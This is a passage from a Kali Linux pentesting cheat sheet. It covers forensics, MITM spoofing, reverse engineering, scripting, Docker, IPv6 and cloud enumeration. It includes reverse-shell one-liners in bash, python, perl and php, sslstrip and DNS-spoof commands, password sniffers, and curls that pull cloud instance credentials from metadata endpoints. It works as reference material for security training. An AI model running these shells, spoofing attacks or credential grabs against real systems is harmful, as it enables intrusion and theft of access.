volatility -f memory.dmp --profile=Win7SP1x64 netscan
volatility -f memory.dmp --profile=Win7SP1x64 hashdump
volatility -f memory.dmp --profile=Win7SP1x64 dumpfiles -Q 0x12345678 -D /tmp/
volatility -f memory.dmp --profile=Win7SP1x64 cmdscan
volatility -f memory.dmp --profile=Win7SP1x64 filescan
volatility -f memory.dmp --profile=Win7SP1x64 memdump -p 1234 -D /tmp/
volatility -f memory.dmp --profile=Win7SP1x64 screenshot -D /tmp/
volatility -f memory.dmp --profile=Win7SP1x64 clipboard
volatility -f memory.dmp --profile=Win7SP1x64 iehistory
volatility3 -f memory.dmp windows.pslist  # volatility3 syntax
```

### binwalk — Firmware Analysis
```bash
binwalk firmware.bin             # analyze
binwalk -e firmware.bin          # extract
binwalk -M firmware.bin          # recursive extraction
binwalk -E firmware.bin          # entropy analysis
binwalk --dd='.*' firmware.bin   # extract all types
```

### foremost — File Carving
```bash
foremost -i disk.img -o output/
foremost -t jpg,png,pdf -i disk.img -o output/
foremost -v -i disk.img -o output/   # verbose
```

### scalpel — File Carving
```bash
scalpel disk.img -o output/
scalpel -c /etc/scalpel/scalpel.conf disk.img -o output/
```

### photorec — Photo Recovery
```bash
photorec disk.img
photorec /dev/sdb
```

### testdisk — Partition Recovery
```bash
testdisk disk.img
testdisk /dev/sdb
```

### dc3dd — Forensic Imaging
```bash
dc3dd if=/dev/sdb of=image.dd hash=sha256 hlog=hash.log
dc3dd if=/dev/sdb | gzip -9 > image.gz
```

### md5sum / sha256sum — File Hashing
```bash
md5sum file.txt
sha256sum file.txt
sha1sum file.txt
sha512sum file.txt
md5sum -c checksums.md5          # verify
sha256sum file.iso > file.sha256
```

### strings — Extract Strings
```bash
strings malware.exe
strings -n 8 malware.exe         # min 8 chars
strings malware.exe | grep -i http
strings malware.exe | grep -i password
```

### exiftool — Metadata Extractor
```bash
exiftool image.jpg
exiftool -a -u image.jpg          # all tags including unknown
exiftool -GPS:all image.jpg       # GPS data
exiftool -Author -Title doc.pdf  # specific tags
exiftool -all= image.jpg          # strip all metadata
exiftool -r /path/to/photos/     # recursive
exiftool -csv photos/ > metadata.csv
```

### Wireshark / tshark — Packet Analysis
```bash
wireshark                        # GUI
tshark -i eth0                   # CLI capture
tshark -r capture.pcap           # read file
tshark -r capture.pcap -Y http   # filter
tshark -r capture.pcap -Y "ip.addr==192.168.1.1"
tshark -r capture.pcap -T fields -e http.request.uri
tshark -r capture.pcap -w filtered.pcap -Y http
tshark -r capture.pcap -qz io,stat,1  # statistics
```

### bulk_extractor — Data Extraction
```bash
bulk_extractor -o output/ disk.img
bulk_extractor -o output/ memory.dmp
bulk_extractor -E email -o output/ disk.img  # emails only
```

---

## 24. SNIFFING & SPOOFING

### arpspoof / arpwatch
```bash
arpspoof -i eth0 -t 192.168.1.2 192.168.1.1   # spoof gateway to victim
arpspoof -i eth0 -t 192.168.1.1 192.168.1.2   # spoof victim to gateway
echo 1 > /proc/sys/net/ipv4/ip_forward         # enable forwarding

# ARP monitoring
arpwatch -i eth0
```

### ettercap — MITM Attack
```bash
ettercap -T -q -i eth0                          # text mode, quiet
ettercap -G                                      # GUI mode
ettercap -T -q -M arp /192.168.1.2// /192.168.1.1//  # ARP MITM
ettercap -T -q -M arp:remote /192.168.1.2// /192.168.1.1//
ettercap -T -q -i eth0 -P dns_spoof -M arp /192.168.1.2// /192.168.1.1//
```

### bettercap — Modern MITM
```bash
bettercap                        # interactive mode
bettercap -iface eth0

# Inside bettercap:
net.probe on
net.show                         # show hosts
set arp.spoof.targets 192.168.1.2
arp.spoof on
net.sniff on
set http.proxy.sslstrip true
http.proxy on
dns.spoof on
set dns.spoof.domains *.google.com,facebook.com
set dns.spoof.address 192.168.1.100
```

### dsniff — Password Sniffer
```bash
dsniff -i eth0                   # sniff passwords
dsniff -r capture.pcap          # from file
urlsnarf -i eth0                 # sniff URLs
mailsnarf -i eth0                # sniff emails
filesnarf -i eth0                # sniff files
msgsnarf -i eth0                 # sniff messages
webspy -i eth0 192.168.1.2       # spy on browsing
```

### responder — LLMNR/NBT-NS Poison
```bash
responder -I eth0
responder -I eth0 -w             # wpad
responder -I eth0 -r             # netbios
responder -I eth0 -F             # force WPAD auth
responder -I eth0 -A             # analyze mode
```

### mitmproxy — HTTP MITM
```bash
mitmproxy -p 8080                # interactive
mitmweb -p 8080                  # web UI
mitmdump -p 8080 -w output.pcap  # dump to file
mitmdump -p 8080 -r saved.pcap   # replay
```

---

## 25. REVERSE ENGINEERING

### gdb — GNU Debugger
```bash
gdb ./binary
gdb -q ./binary                  # quiet
gdb --args ./binary arg1 arg2

# Inside gdb:
# run (r) - run program
# break main (b main) - set breakpoint
# next (n) - step over
# step (s) - step into
# continue (c) - continue
# info registers - show registers
# x/10x $esp - examine memory
# disassemble main - disassemble
# set disassembly-flavor intel
# info breakpoints
# delete 1 (d 1) - delete breakpoint
# print $eax (p $eax) - print register
# backtrace (bt) - stack trace
# quit (q) - quit
```

### radare2 — Reverse Engineering Framework
```bash
r2 binary                        # open binary
r2 -d binary                     # debug mode
r2 -A binary                     # analyze all

# Inside r2:
# aaa - analyze all
# afl - list functions
# pdf @ main - disassemble main
# s main - seek to main
# V - visual mode
# VV - visual graph mode
# iz - list strings
# iE - list exports
# ii - list imports
# pxr 64 @ esp - examine memory
# !!! - help
```

### objdump — Object File Dump
```bash
objdump -d binary                # disassemble
objdump -D binary                # disassemble all sections
objdump -M intel -d binary       # Intel syntax
objdump -x binary                # all headers
objdump -s binary                # full contents
objdump -t binary                # symbol table
```

### readelf — ELF File Analysis
```bash
readelf -a binary                # all info
readelf -h binary                # ELF header
readelf -S binary                # section headers
readelf -l binary                # program headers
readelf -d binary                # dynamic section
readelf -s binary                # symbol tables
```

### ltrace / strace
```bash
ltrace ./binary                  # library calls
ltrace -e strcmp ./binary        # specific call
strace ./binary                  # system calls
strace -p 1234                   # attach to PID
strace -e trace=read,write ./binary
```

### file / ldd / nm
```bash
file binary                      # file type
ldd binary                       # library dependencies
nm binary                        # symbol list
nm -D binary                     # dynamic symbols
nm -u binary                     # undefined symbols
```

### pwndbg / peda — GDB Plugins
```bash
# After installing pwndbg:
gdb -q ./binary
# checksec - check security features
# pattern create 100 - cyclic pattern
# pattern offset $eip - find offset
```

### Ghidra — NSA Reverse Engineering Tool
```bash
ghidra
# Launch from /opt/ghidra/ghidraRun
```

---

## 26. CRYPTOGRAPHY & STEGANOGRAPHY

### openssl — SSL/TLS/Crypto Toolkit
```bash
# Encryption
openssl enc -aes-256-cbc -salt -in plain.txt -out encrypted.bin
openssl enc -d -aes-256-cbc -in encrypted.bin -out plain.txt

# Hashing
openssl dgst -md5 file.txt
openssl dgst -sha256 file.txt
openssl dgst -sha512 file.txt

# Generate RSA key
openssl genrsa -out private.pem 4096
openssl rsa -in private.pem -pubout -out public.pem
openssl rsa -in private.pem -text

# Encrypt/Decrypt with RSA
openssl rsautl -encrypt -inkey public.pem -pubin -in plain.txt -out encrypted.bin
openssl rsautl -decrypt -inkey private.pem -in encrypted.bin -out plain.txt

# Certificates
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl x509 -in cert.pem -text
openssl x509 -in cert.pem -noout -dates
openssl s_client -connect example.com:443  # test SSL connection
openssl verify -CAfile ca.pem cert.pem

# Base64
openssl base64 -in file.txt -out file.b64
openssl base64 -d -in file.b64 -out file.txt
echo "hello" | openssl base64
echo "aGVsbG8=" | openssl base64 -d

# Password hashing
openssl passwd -6 mypassword         # SHA-512
openssl passwd -apr1 mypassword      # Apache MD5
```

### gpg — GNU Privacy Guard
```bash
gpg --gen-key                    # generate keypair
gpg --list-keys                  # list public keys
gpg --list-secret-keys           # list private keys
gpg --export -a "User Name" > public.asc
gpg --import public.asc
gpg -e -r "User Name" file.txt   # encrypt
gpg -d file.txt.gpg              # decrypt
gpg --sign file.txt              # sign file
gpg --verify file.txt.gpg        # verify signature
gpg --symmetric -c file.txt      # symmetric encryption
gpg --keyserver keyserver.ubuntu.com --search-keys user@email.com
```

### steghide — Steganography
```bash
steghide embed -cf image.jpg -sf secret.txt     # hide file
steghide embed -cf image.jpg -sf secret.txt -p password
steghide extract -sf image.jpg                  # extract
steghide extract -sf image.jpg -p password
steghide info image.jpg                         # info
```

### stegseek — Steg Cracker
```bash
stegseek image.jpg rockyou.txt
stegseek image.jpg rockyou.txt -xf extracted.txt
```

### zsteg — PNG/BMP Steg Analysis
```bash
zsteg image.png
zsteg -a image.png               # all checks
zsteg -e "b1,r,lsb,xy" image.png # specific channel
```

### exiftool (metadata hiding)
```bash
exiftool -Comment="secret message" image.jpg
exiftool -Comment image.jpg      # read comment
```

### base64 / xxd / encoding
```bash
base64 file.txt                  # encode
base64 -d encoded.txt            # decode
echo "hello world" | base64
echo "aGVsbG8gd29ybGQ=" | base64 -d

# ROT13
echo "Hello" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
cat file.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

---

## 27. SHELL SCRIPTING BASICS

### Bash Script Structure
```bash
#!/bin/bash
# Script: example.sh

# Variables
NAME="Kali"
AGE=2024
echo "Name: $NAME, Year: $AGE"

# Input
read -p "Enter IP: " IP
echo "Scanning $IP"

# Conditions
if [ -z "$IP" ]; then
    echo "No IP provided"
    exit 1
fi

if [ "$IP" == "localhost" ]; then
    echo "It's localhost"
elif [ "$IP" == "127.0.0.1" ]; then
    echo "Loopback address"
else
    echo "Remote host: $IP"
fi

# Loops
for host in 192.168.1.{1..10}; do
    ping -c1 -W1 $host &>/dev/null && echo "$host is up"
done

# While loop
COUNT=0
while [ $COUNT -lt 5 ]; do
    echo "Count: $COUNT"
    ((COUNT++))
done

# Functions
scan_host() {
    local target=$1
    nmap -sV -sC $target
}
scan_host 192.168.1.1

# Arrays
TOOLS=("nmap" "nikto" "sqlmap" "metasploit")
for tool in "${TOOLS[@]}"; do
    echo "Tool: $tool"
done

# File test operators
if [ -f "/etc/passwd" ]; then echo "file exists"; fi
if [ -d "/tmp" ]; then echo "directory exists"; fi
if [ -r "file.txt" ]; then echo "file is readable"; fi
if [ -x "script.sh" ]; then echo "file is executable"; fi

# String tests
if [ -n "$VAR" ]; then echo "not empty"; fi
if [ -z "$VAR" ]; then echo "empty"; fi
if [ "$A" == "$B" ]; then echo "equal"; fi
if [ "$A" != "$B" ]; then echo "not equal"; fi

# Numeric tests
if [ $NUM -eq 10 ]; then echo "equal to 10"; fi
if [ $NUM -gt 5 ]; then echo "greater than 5"; fi
if [ $NUM -lt 20 ]; then echo "less than 20"; fi
if [ $NUM -ge 10 ]; then echo "greater or equal"; fi

# Case statement
case "$1" in
    scan)   echo "Running scan";;
    brute)  echo "Running brute force";;
    *)      echo "Unknown option";;
esac

# Exit codes
command && echo "success" || echo "failed"
if [ $? -eq 0 ]; then echo "Last command succeeded"; fi
```

### Useful Script Patterns
```bash
# Port scanner in bash
for port in $(seq 1 1000); do
    (echo >/dev/tcp/192.168.1.1/$port) &>/dev/null && echo "Port $port open"
done

# Subnet pinger
for i in $(seq 1 254); do
    ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i is up" &
done
wait

# Password list generator
for name in admin user test root; do
    for year in 2023 2024 2025; do
        echo "${name}${year}"
        echo "${name}@${year}"
        echo "${name}${year}!"
    done
done

# HTTP status checker
while read url; do
    status=$(curl -o /dev/null -s -w "%{http_code}" "$url")
    echo "$url : $status"
done < urls.txt
```

---

## 28. LOGS & MONITORING

### Log Files
```bash
# Important log locations
/var/log/syslog                  # system log
/var/log/auth.log                # authentication log
/var/log/kern.log                # kernel log
/var/log/apache2/access.log      # Apache access
/var/log/apache2/error.log       # Apache errors
/var/log/nginx/access.log        # Nginx access
/var/log/mysql/error.log         # MySQL errors
/var/log/mail.log                # mail log
/var/log/dpkg.log                # package installs
/var/log/fail2ban.log            # fail2ban log

# Reading logs
tail -f /var/log/syslog          # live follow
tail -100 /var/log/auth.log      # last 100 lines
grep "Failed" /var/log/auth.log  # failed logins
grep "sshd" /var/log/auth.log    # SSH events
journalctl -u ssh -f             # SSH service logs
```

### fail2ban — Intrusion Prevention
```bash
systemctl start fail2ban
systemctl status fail2ban
fail2ban-client status
fail2ban-client status sshd      # specific jail
fail2ban-client set sshd unbanip 192.168.1.100  # unban IP
cat /etc/fail2ban/jail.conf      # config
```

### logwatch — Log Analyzer
```bash
logwatch --detail High --mailto root --range today
logwatch --service sshd --range yesterday
```

### auditd — System Auditing
```bash
systemctl start auditd
auditctl -l                      # list rules
auditctl -w /etc/passwd -p rwxa  # watch file
auditctl -w /bin/bash -p x       # watch execution
ausearch -k passwd-changes       # search audit log
ausearch -ui 1000                # by user ID
aureport --summary               # summary report
```

---

## 29. ENVIRONMENT & VARIABLES

### Environment Variables
```bash
env                              # show all variables
printenv                         # print environment
echo $PATH
echo $HOME
echo $USER
echo $SHELL
echo $HOSTNAME
echo $LANG
echo $TERM
echo $PS1                        # prompt string

# Set variables
export VARIABLE="value"
export PATH="$PATH:/new/path"

# Unset variables
unset VARIABLE

# Persistent (add to ~/.bashrc or ~/.zshrc)
echo 'export MYVAR="value"' >> ~/.bashrc
echo 'export PATH="$PATH:/opt/tools"' >> ~/.bashrc
source ~/.bashrc
```

### .bashrc / .zshrc Configuration
```bash
# Common additions to ~/.bashrc

# Custom aliases
alias ll='ls -la --color=auto'
alias grep='grep --color=auto'
alias update='sudo apt update && sudo apt upgrade -y'
alias c='clear'

# Custom prompt
export PS1='\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '

# Add to PATH
export PATH="$PATH:/opt/tools:/usr/local/bin"

# History settings
HISTSIZE=10000
HISTFILESIZE=20000
HISTTIMEFORMAT="%F %T "
export HISTIGNORE="ls:pwd:clear:history"

# Source changes
source ~/.bashrc
```

---

## 30. MISCELLANEOUS & USEFUL TRICKS

### Redirects & Pipes
```bash
command > file.txt               # stdout to file
command >> file.txt              # append stdout
command 2> error.txt             # stderr to file
command 2>&1 > all.txt           # both to file
command 2>/dev/null              # discard errors
command1 | command2              # pipe stdout
command1 |& command2             # pipe stdout+stderr
command < input.txt              # stdin from file
command <<< "string"             # here-string
cat <<EOF
multi
line
text
EOF
```

### Job Control
```bash
command &                        # run in background
Ctrl+Z                           # suspend process
bg                               # resume in background
fg                               # bring to foreground
jobs -l                          # list jobs
disown %1                        # disown job
wait                             # wait for all background jobs
```

### Useful One-Liners
```bash
# Find all SUID binaries
find / -perm /4000 2>/dev/null

# Extract all IPs from file
grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" file.txt

# Check if host is up
ping -c1 192.168.1.1 &>/dev/null && echo "UP" || echo "DOWN"

# Quick HTTP server
python3 -m http.server 8000

# Quick HTTP server on specific IP
python3 -m http.server 8000 --bind 0.0.0.0

# Count unique IPs in log
awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -20

# Find largest files
du -ah / 2>/dev/null | sort -rh | head -20

# Kill all processes by name
ps aux | grep firefox | awk '{print $2}' | xargs kill

# Monitor file changes
inotifywait -m /etc/passwd

# Create reverse shell (many options)
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
perl -e 'use Socket;$i="192.168.1.100";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$sock=fsockopen("192.168.1.100",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Upgrade shell to full TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then: Ctrl+Z, stty raw -echo, fg, export TERM=xterm

# Quickly check running web services
netstat -tlnp | grep -E ':80|:443|:8080|:8443'

# Find files modified in last 24 hours
find / -mtime -1 2>/dev/null | grep -v proc

# Decode URL encoding
python3 -c "import urllib.parse; print(urllib.parse.unquote('Hello%20World'))"

# Encode URL
python3 -c "import urllib.parse; print(urllib.parse.quote('Hello World'))"

# Quick math in bash
echo $((2**10))
echo "scale=4; 22/7" | bc

# Generate random password
openssl rand -base64 20
tr -dc 'A-Za-z0-9!@#$%' < /dev/urandom | head -c 16

# Monitor network traffic per process
nethogs eth0

# Show routing in real time
route -n
watch -n1 'route -n'
```

### Kali Specific Tools Locations
```bash
/usr/share/wordlists/            # wordlists
/usr/share/wordlists/rockyou.txt.gz
gunzip /usr/share/wordlists/rockyou.txt.gz

/usr/share/nmap/scripts/         # nmap scripts
/usr/share/metasploit-framework/ # metasploit
/usr/share/exploitdb/            # exploit-db
/usr/share/sqlmap/               # sqlmap
/usr/share/john/                 # john config
/etc/aircrack-ng/                # aircrack config
```

### searchsploit — Exploit Database
```bash
searchsploit apache 2.4
searchsploit -t "remote code execution"
searchsploit ms17-010
searchsploit -x 12345            # view exploit
searchsploit -m 12345            # copy exploit to current dir
searchsploit --update            # update database
searchsploit -w apache           # show URLs
```

### Wordlists
```bash
ls /usr/share/wordlists/
ls /usr/share/seclists/          # seclists package
ls /usr/share/dirbuster/wordlists/

# Common paths
/usr/share/wordlists/rockyou.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/wordlists/dirb/big.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Passwords/
/usr/share/seclists/Usernames/
```

### Terminal Shortcuts
```bash
Ctrl+A    # go to beginning of line
Ctrl+E    # go to end of line
Ctrl+U    # delete to beginning of line
Ctrl+K    # delete to end of line
Ctrl+W    # delete previous word
Ctrl+R    # reverse search history
Ctrl+C    # cancel / kill process
Ctrl+Z    # suspend process
Ctrl+D    # logout / EOF
Ctrl+L    # clear screen
Ctrl+S    # stop terminal output
Ctrl+Q    # resume terminal output
Alt+.     # last argument of previous command
Tab       # auto-complete
!!        # repeat last command
!$        # last argument of last command
!*        # all arguments of last command
```

---

## 31. DOCKER & CONTAINERS

### docker — Container Management
```bash
# Installation check
docker --version
docker info

# Images
docker images                            # list local images
docker pull kalilinux/kali-rolling       # pull image
docker pull ubuntu:22.04
docker rmi image_name                    # remove image
docker image prune                       # remove unused images
docker search kali                       # search Docker Hub

# Containers — Run
docker run -it ubuntu bash               # interactive shell
docker run -it --rm ubuntu bash          # remove after exit
docker run -d nginx                      # detached (background)
docker run -d -p 8080:80 nginx           # port mapping
docker run -d -p 8080:80 -v /host:/container nginx  # volume mount
docker run --name mycontainer ubuntu
docker run --network host ubuntu         # host networking
docker run --privileged ubuntu           # privileged (pentest use)
docker run -e VAR=value ubuntu           # environment variable

# Containers — Manage
docker ps                                # running containers
docker ps -a                             # all containers
docker start mycontainer
docker stop mycontainer
docker restart mycontainer
docker rm mycontainer                    # remove container
docker rm -f mycontainer                 # force remove
docker container prune                   # remove all stopped

# Containers — Interact
docker exec -it mycontainer bash         # shell into running container
docker exec mycontainer ls /tmp
docker attach mycontainer                # attach to container
docker logs mycontainer                  # view logs
docker logs -f mycontainer               # follow logs
docker inspect mycontainer               # detailed info (JSON)
docker stats                             # live resource usage
docker top mycontainer                   # processes inside container

# Files
docker cp file.txt mycontainer:/tmp/     # copy to container
docker cp mycontainer:/tmp/file.txt ./   # copy from container

# Build
docker build -t myimage .                # build from Dockerfile
docker build -t myimage:v1 -f Dockerfile.prod .
docker tag myimage user/myimage:latest
docker push user/myimage:latest

# Networks
docker network ls
docker network create mynet
docker network inspect mynet
docker run --network mynet ubuntu

# Volumes
docker volume ls
docker volume create myvol
docker volume inspect myvol
docker volume rm myvol
docker volume prune

# Kali Linux in Docker
docker pull kalilinux/kali-rolling
docker run -it kalilinux/kali-rolling bash
# Inside: apt update && apt install -y kali-linux-headless

# Save / Load images (offline transfer)
docker save myimage > myimage.tar
docker load < myimage.tar
docker export mycontainer > container.tar
docker import container.tar myimage:imported
```

### docker-compose — Multi-Container Apps
```bash
docker-compose up                        # start all services
docker-compose up -d                     # detached
docker-compose down                      # stop and remove
docker-compose down -v                   # also remove volumes
docker-compose ps                        # list services
docker-compose logs -f                   # follow logs
docker-compose build                     # build images
docker-compose exec web bash             # shell into service
docker-compose restart web
docker-compose pull                      # pull latest images

# Example docker-compose.yml for pentest lab
# version: '3'
# services:
#   kali:
#     image: kalilinux/kali-rolling
#     tty: true
#     volumes:
#       - ./tools:/opt/tools
#   victim:
#     image: vulhub/apache:2.4.49
#     ports:
#       - "8080:80"
```

---

## 32. PYTHON FOR PENTESTING

### Python One-Liners
```bash
# Quick HTTP server
python3 -m http.server 8000
python3 -m http.server 8000 --bind 0.0.0.0

# Quick HTTPS server (self-signed)
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=localhost"
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, keyfile='key.pem', certfile='cert.pem')
server.serve_forever()
"

# Base64 encode/decode
python3 -c "import base64; print(base64.b64encode(b'hello world').decode())"
python3 -c "import base64; print(base64.b64decode('aGVsbG8gd29ybGQ=').decode())"

# URL encode/decode
python3 -c "import urllib.parse; print(urllib.parse.quote('hello world & more'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('hello+world+%26+more'))"

# MD5 / SHA hash
python3 -c "import hashlib; print(hashlib.md5(b'password').hexdigest())"
python3 -c "import hashlib; print(hashlib.sha256(b'password').hexdigest())"
python3 -c "import hashlib; print(hashlib.sha1(b'admin').hexdigest())"

# Generate random bytes / tokens
python3 -c "import os; print(os.urandom(16).hex())"
python3 -c "import secrets; print(secrets.token_hex(16))"

# XOR two strings
python3 -c "a=b'hello'; b=b'world'; print(bytes(x^y for x,y in zip(a,b)))"

# Reverse shell (one-liner)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Upgrade shell TTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Python Socket Scripts
```python
# TCP Port Scanner (save as scanner.py)
import socket, sys
target = sys.argv[1]
for port in range(1, 1025):
    s = socket.socket()
    s.settimeout(0.5)
    if s.connect_ex((target, port)) == 0:
        print(f"[+] Port {port} OPEN")
    s.close()

# Simple TCP Listener (netcat replacement)
import socket
s = socket.socket()
s.bind(('0.0.0.0', 4444))
s.listen(1)
conn, addr = s.accept()
print(f"[+] Connection from {addr}")
while True:
    data = conn.recv(1024)
    if not data: break
    print(data.decode())

# Banner Grabbing
import socket
def grab_banner(ip, port):
    s = socket.socket()
    s.settimeout(2)
    try:
        s.connect((ip, port))
        banner = s.recv(1024).decode().strip()
        print(f"{ip}:{port} -> {banner}")
    except: pass
    finally: s.close()
```

### Python requests — HTTP Testing
```python
# Install: pip install requests

import requests

# Basic GET
r = requests.get('http://target.com')
print(r.status_code, r.text)

# Custom headers
headers = {'User-Agent': 'Mozilla/5.0', 'X-Custom': 'value'}
r = requests.get('http://target.com', headers=headers)

# POST with data
r = requests.post('http://target.com/login', data={'user':'admin','pass':'password'})

# POST with JSON
r = requests.post('http://target.com/api', json={'key':'value'})

# Cookies
r = requests.get('http://target.com', cookies={'session':'abc123'})

# Proxy through Burp/SOCKS
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
r = requests.get('http://target.com', proxies=proxies, verify=False)

# Session (persist cookies)
s = requests.Session()
s.post('http://target.com/login', data={'user':'admin','pass':'password'})
r = s.get('http://target.com/dashboard')   # authenticated

# File upload
files = {'file': open('shell.php','rb')}
r = requests.post('http://target.com/upload', files=files)

# Directory brute force
wordlist = open('/usr/share/wordlists/dirb/common.txt').read().splitlines()
for word in wordlist:
    url = f'http://target.com/{word}'
    r = requests.get(url)
    if r.status_code == 200:
        print(f'[+] Found: {url}')
```

### Python subprocess & OS
```python
import subprocess, os

# Run command, get output
output = subprocess.check_output(['nmap', '-sV', '192.168.1.1'], text=True)
print(output)

# Run shell command
subprocess.run('whoami', shell=True)

# Check sudo rights
result = subprocess.run(['sudo', '-l'], capture_output=True, text=True)
print(result.stdout)

# Environment variables
print(os.environ.get('PATH'))
print(os.getcwd())
print(os.listdir('/tmp'))

# Execute and get return code
ret = os.system('ping -c1 192.168.1.1 > /dev/null 2>&1')
print("UP" if ret == 0 else "DOWN")
```

---

## 33. IPV6 PENETRATION TESTING

### IPv6 Basics
```bash
# Show IPv6 addresses
ip -6 addr show
ifconfig | grep inet6

# Ping IPv6
ping6 ::1                            # loopback
ping6 fe80::1%eth0                   # link-local (needs interface)
ping6 -c 4 2001:db8::1

# IPv6 routing
ip -6 route show
ip -6 route add default via fe80::1 dev eth0

# DNS lookup IPv6 (AAAA records)
dig google.com AAAA
nslookup -type=AAAA google.com
host -t AAAA google.com

# Traceroute IPv6
traceroute6 google.com
tracepath6 google.com
```

### THC-IPv6 Toolkit
```bash
# Install
apt install thc-ipv6

# alive6 — Discover live IPv6 hosts
alive6 eth0                          # find all IPv6 on local network
alive6 -I eth0 2001:db8::/64        # scan specific range

# parasite6 — ARP spoof equivalent for IPv6 (NDP spoofing)
parasite6 eth0                       # hijack all IPv6 addresses
parasite6 -l eth0                    # also answer link-local

# fake_router6 — Announce fake IPv6 router
fake_router6 eth0 2001:db8::/64

# flood_router6 — Flood with fake router advertisements
flood_router6 eth0

# flood_neighbors6 — NDP neighbor flood
flood_neighbors6 eth0

# ndpwatch6 — Monitor NDP traffic
ndpwatch6 eth0

# address6 — Convert IPv4 to IPv6 formats
address6 192.168.1.1
address6 ::ffff:192.168.1.1

# detect-new-ipv6 — Detect new IPv6 nodes
detect-new-ipv6 eth0

# dnsdict6 — IPv6 DNS brute force
dnsdict6 -s -t example.com
dnsdict6 -d -t 4 example.com
```

### Nmap IPv6 Scanning
```bash
nmap -6 ::1                          # scan localhost IPv6
nmap -6 fe80::1%eth0                 # scan link-local
nmap -6 -sV 2001:db8::1             # service version
nmap -6 -sC 2001:db8::1             # default scripts
nmap -6 --script=ipv6-node-info target
nmap -6 -p- 2001:db8::1             # all ports
nmap -6 -sn fe80::/64 --interface eth0  # host discovery

# IPv6 Nmap scripts
nmap -6 --script ipv6-ra-flood eth0
nmap -6 --script targets-ipv6-multicast-echo --script-args newtargets -sV
```

### Metasploit IPv6
```bash
msfconsole
use auxiliary/scanner/discovery/ipv6_neighbor
set INTERFACE eth0
run

use auxiliary/scanner/portscan/tcp
set RHOSTS 2001:db8::1
run
```

---

## 34. CLOUD ENUMERATION TOOLS

### AWS CLI — Amazon Web Services
```bash
# Install
apt install awscli
pip install awscli

# Configure credentials
aws configure
# AWS Access Key ID:
# AWS Secret Access Key:
# Default region: us-east-1

# Identity & Access
aws sts get-caller-identity           # who am I?
aws iam get-user
aws iam list-users
aws iam list-roles
aws iam list-policies --scope Local
aws iam get-user-policy --user-name admin --policy-name policy1
aws iam list-attached-user-policies --user-name admin
aws iam list-groups-for-user --user-name admin
aws iam list-access-keys --user-name admin

# S3 Buckets
aws s3 ls                             # list all buckets
aws s3 ls s3://bucket-name           # list bucket contents
aws s3 cp s3://bucket/file ./        # download file
aws s3 cp file.txt s3://bucket/      # upload file
aws s3 sync s3://bucket ./local/     # sync bucket
aws s3 rb s3://bucket --force        # delete bucket

# Check public bucket (no creds needed)
aws s3 ls s3://target-bucket --no-sign-request

# EC2
aws ec2 describe-instances
aws ec2 describe-security-groups
aws ec2 describe-vpcs
aws ec2 describe-subnets
aws ec2 describe-key-pairs
aws ec2 describe-images --owners self

# Lambda
aws lambda list-functions
aws lambda get-function --function-name myfunction
aws lambda invoke --function-name myfunction output.txt

# Secrets Manager
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id mySecret

# Metadata (from EC2 instance — SSRF target)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/user-data/
```

### Azure CLI — Microsoft Azure
```bash
# Install
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Login
az login
az login --use-device-code

# Account info
az account show                       # current subscription
az account list                       # all subscriptions
az account set --subscription "Sub Name"

# Identity
az ad signed-in-user show
az ad user list
az ad group list
az ad sp list                         # service principals
az role assignment list --all

# Resources
az resource list
az vm list
az vm list-ip-addresses
az storage account list
az keyvault list

# Key Vault secrets (if access allowed)
az keyvault secret list --vault-name myVault
az keyvault secret show --vault-name myVault --name mySecret

# Metadata (from Azure VM — SSRF target)
curl -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

### GCloud CLI — Google Cloud Platform
```bash
# Install
apt install google-cloud-cli

# Auth
gcloud auth login
gcloud auth application-default login
gcloud config set project PROJECT_ID

# Account info
gcloud config list
gcloud projects list
gcloud organizations list
gcloud iam service-accounts list

# Compute
gcloud compute instances list
gcloud compute firewall-rules list
gcloud compute networks list
gcloud compute ssh INSTANCE_NAME

# Storage
gcloud storage ls                     # list buckets
gcloud storage ls gs://bucket-name
gcloud storage cp gs://bucket/file ./

# Secrets
gcloud secrets list
gcloud secrets versions access latest --secret=mysecret

# Metadata (from GCP instance — SSRF target)
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

